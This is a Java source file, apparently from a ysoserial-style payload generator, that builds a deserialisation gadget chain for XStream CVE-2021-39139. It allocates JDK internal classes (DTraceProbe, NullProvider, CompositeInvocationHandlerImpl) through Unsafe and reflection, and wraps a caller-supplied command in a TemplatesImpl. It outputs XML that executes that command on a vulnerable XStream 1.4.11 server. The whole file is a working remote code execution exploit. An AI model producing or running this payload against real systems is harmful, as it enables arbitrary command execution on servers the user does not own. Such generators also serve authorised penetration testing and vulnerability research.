package com.h2tg.ysogate.payloads.gadgets;

import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;
import sun.misc.Unsafe;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.converters.reflection.SunUnsafeReflectionProvider;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;

// Xstream CVE-2021-39139

@Dependencies({"Xstream:1.4.11"})
public class XStream1 implements ObjectPayload<Object> {

    private static Unsafe instaniateUnsafe() throws Exception {
        Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        return (Unsafe) unsafeField.get(null);
    }

    private static void setField(String fieldName, Object defineObj, Object value) throws Exception {
        SunUnsafeReflectionProvider reflectionProvider = new SunUnsafeReflectionProvider();
        Field field = reflectionProvider.getFieldOrNull(defineObj.getClass(), fieldName);
        reflectionProvider.writeField(defineObj, fieldName, value, field.getDeclaringClass());
    }

    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        Object dTraceProbe = instaniateUnsafe().allocateInstance(Class.forName("sun.tracing.dtrace.DTraceProbe"));
        Method method_getOutputProperties =  Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").getDeclaredMethod("getOutputProperties");
        setField("proxy", dTraceProbe, templates);
        setField("implementing_method", dTraceProbe, method_getOutputProperties);

        HashMap map = new HashMap();
        Method method_hashcode =  Class.forName("java.lang.Object").getDeclaredMethod("hashCode");
        map.put(method_hashcode, dTraceProbe);

        Object nullProvider = instaniateUnsafe().allocateInstance(Class.forName("sun.tracing.NullProvider"));
        setField("active", nullProvider, true);
        setField("providerType", nullProvider, Class.forName("java.lang.Object"));
        setField("probes", nullProvider, map);

        InvocationHandler handler = (InvocationHandler) instaniateUnsafe().allocateInstance(Class.forName("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl"));
        Object proxy = Proxy.newProxyInstance(
                handler.getClass().getClassLoader(),
                new HashMap().getClass().getInterfaces(),
                handler);

        Reflections.setFieldValue(handler, "classToInvocationHandler", new LinkedHashMap());
        Reflections.setFieldValue(handler, "defaultHandler", nullProvider);

        LinkedHashSet set = new LinkedHashSet();
        // set.add(proxy);
//		System.out.println();

        XStream xStream = new XStream();
//        System.out.println(xStream.toXML(set));
//		System.out.println("<linked-hash-set>");
//		System.out.println(xStream.toXML(proxy));
//		System.out.println("</linked-hash-set>");

        String resp = "<linked-hash-set>\n" + xStream.toXML(proxy) + "\n</linked-hash-set>";

        return resp;
    }
}